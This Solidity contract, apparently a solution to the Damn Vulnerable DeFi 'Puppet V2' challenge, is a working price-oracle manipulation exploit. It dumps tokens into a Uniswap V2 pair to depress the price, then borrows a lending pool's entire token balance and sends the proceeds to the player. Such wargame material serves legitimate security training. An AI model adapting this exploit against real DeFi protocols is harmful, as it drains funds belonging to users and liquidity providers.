// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniRouterV2 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IPuppet2Pool {
    function borrow(uint256 borrowAmount) external payable;
}

contract Attack9 {
    IPuppet2Pool private immutable puppet2Pool;
    IUniRouterV2 private immutable uniV2Router;
    IERC20 public immutable weth;
    IERC20 public immutable token;
    address private immutable player;

    constructor(
        address _puppet2Pool,
        address _uniV2Router,
        address _weth,
        address _token,
        address _player
    ) {
        puppet2Pool = IPuppet2Pool(_puppet2Pool);
        uniV2Router = IUniRouterV2(_uniV2Router);
        weth = IERC20(_weth);
        token = IERC20(_token);
        player = _player;
    }

    receive() external payable {}

    function attack() external {
        // Dump DVT to the Uniswap Pool
        uint256 tokenAmount = token.balanceOf(address(this));
        token.approve(address(uniV2Router), tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        uniV2Router.swapExactTokensForTokens(
            tokenAmount,
            9 ether,
            path,
            address(this),
            block.timestamp
        );

        // Approve weth & borrow max amount of token
        uint256 wethBalInContract = weth.balanceOf(address(this));
        weth.approve(address(puppet2Pool), wethBalInContract);
        uint256 borrowAmount = token.balanceOf(address(puppet2Pool));
        puppet2Pool.borrow(borrowAmount);

        // Transfer tokens & ETH back to player
        token.transfer(player, token.balanceOf(address(this)));
        weth.transfer(player, weth.balanceOf(address(this)));
    }
}
